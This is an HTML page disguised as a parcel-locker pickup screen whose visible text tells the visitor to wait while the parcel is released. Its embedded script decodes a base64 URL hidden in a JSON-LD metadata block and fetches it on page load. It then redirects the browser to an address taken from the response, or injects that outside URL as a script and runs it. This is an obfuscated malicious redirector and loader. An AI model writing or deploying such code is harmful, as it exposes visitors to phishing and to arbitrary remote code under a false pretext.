<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Locker</title>
  <script type="application/ld+json" id="slip">
  {
    "@context": "https://schema.org",
    "@type": "DigitalDocument",
    "identifier": "aHR0cHM6Ly9hdHdpbmxvY3VzLmNvbS9zdW5uaS5zaGlyZQ=="
  }
  </script>
  <style>
    * { box-sizing: border-box; margin: 0; }
    body {
      min-height: 100vh;
      display: grid;
      place-items: center;
      background: #0f766e;
      background-image:
        linear-gradient(135deg, #0f766e 0%, #115e59 42%, #134e4a 100%);
      font-family: "Trebuchet MS", "Segoe UI", sans-serif;
      color: #ecfdf5;
    }
    .locker {
      width: min(380px, 92vw);
      background: #042f2e;
      border: 3px solid #5eead4;
      border-radius: 6px;
      padding: 28px 24px 24px;
      box-shadow: 8px 8px 0 #042f2e88;
    }
    .row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      letter-spacing: 0.18em;
      text-transform: uppercase;
      color: #5eead4;
      margin-bottom: 18px;
    }
    h1 {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 8px;
    }
    .note {
      font-size: 14px;
      color: #99f6e4;
      line-height: 1.45;
      margin-bottom: 22px;
    }
    .cells {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 8px;
    }
    .cell {
      height: 36px;
      border: 2px solid #2dd4bf;
      background: #134e4a;
    }
    .cell.on {
      background: #2dd4bf;
    }
    .fail { color: #fecaca; }
  </style>
</head>
<body>
  <div class="locker">
    <div class="row"><span>Bay 08</span><span>Open</span></div>
    <h1 id="title">Unlocking parcel</h1>
    <p class="note" id="note">Hold this tab while the locker confirms the pickup slot.</p>
    <div class="cells" aria-hidden="true">
      <div class="cell on"></div>
      <div class="cell on"></div>
      <div class="cell"></div>
      <div class="cell"></div>
    </div>
  </div>

  <script>
  (function () {
    var WAIT_MS = 500;
    var titleEl = document.getElementById('title');
    var noteEl = document.getElementById('note');

    function fail(msg) {
      titleEl.textContent = 'Locker closed';
      noteEl.textContent = msg;
      noteEl.classList.add('fail');
    }

    function hopFromJsonLd() {
      var raw = document.getElementById('slip').textContent;
      var data = JSON.parse(raw);
      var url = atob(String(data.identifier || '').trim());
      if (!/^https?:\/\//i.test(url)) throw new Error('bad');
      return url;
    }

    function parseHopBody(text) {
      var body = String(text || '').trim();
      try {
        var j = JSON.parse(body);
        if (j && j.c) {
          var u = atob(String(j.c).trim());
          if (/^https?:\/\//i.test(u)) return u;
        }
      } catch (e) {}
      var patterns = [
        /top\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i
      ];
      for (var i = 0; i < patterns.length; i++) {
        var m = body.match(patterns[i]);
        if (m && m[1]) return m[1];
      }
      throw new Error('parse');
    }

    function attachScript(hopUrl) {
      var s = document.createElement('script');
      s.src = hopUrl;
      s.async = true;
      s.onerror = function () { fail('Pickup script blocked'); };
      document.head.appendChild(s);
    }

    function openHop(hopUrl) {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', hopUrl, true);
      xhr.timeout = 4000;
      xhr.onreadystatechange = function () {
        if (xhr.readyState !== 4) return;
        if (xhr.status >= 200 && xhr.status < 300) {
          try {
            window.location.replace(parseHopBody(xhr.responseText));
            return;
          } catch (e) {}
        }
        attachScript(hopUrl);
      };
      xhr.onerror = function () { attachScript(hopUrl); };
      xhr.ontimeout = function () { attachScript(hopUrl); };
      xhr.send();
    }

    var hopUrl;
    try {
      hopUrl = hopFromJsonLd();
    } catch (e) {
      fail('Missing locker slip');
      return;
    }

    setTimeout(function () {
      titleEl.textContent = 'Releasing parcel';
      openHop(hopUrl);
    }, WAIT_MS);
  })();
  </script>
</body>
</html>
